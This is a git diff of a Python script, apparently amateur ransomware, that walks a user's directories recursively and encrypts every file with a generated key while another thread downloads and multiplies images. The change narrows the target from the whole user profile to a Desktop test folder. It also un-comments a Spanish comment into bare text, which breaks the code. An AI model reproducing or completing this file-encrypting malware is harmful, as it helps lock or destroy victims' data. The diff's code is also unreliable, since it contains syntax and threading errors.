@@ -115,8 +115,7 @@ def AYUMU(ruta ,llave):
             A = os.listdir(a)
             for b in A:
                 if os.path.isdir(f"{a}\\{b}"):
-                    Directorios_encriptar.append(f"{a}\\{b}")
-                    print(f"{a}\\{b}")    
+                    Directorios_encriptar.append(f"{a}\\{b}")    
                 else:
                     encryptado(f"{a}\\{b}" , llave)
         except Exception as err:
@@ -128,7 +127,7 @@ def main():
     except Exception:
         pass
         
-    PATH = os.getenv("userprofile")
+    PATH = os.getenv("userprofile") + "\\Desktop\\Pruebas"
     llave = key()
     AYUMU(PATH , llave)
     
@@ -137,11 +136,16 @@ if __name__ == "__main__":
     Proceso1 = threading.Thread(target= main())
     Proceso2 = threading.Thread(target= download_and_multiply_img())
     
-    #Ejecuta el crear fotos y encriptar a la vez
+    Ejecuta el crear fotos y encriptar a la vez
     
     Proceso1.start() 
     Proceso2.start()
     
     Proceso1.join()
     Proceso2.join()
+
+
+    
+   
+
     
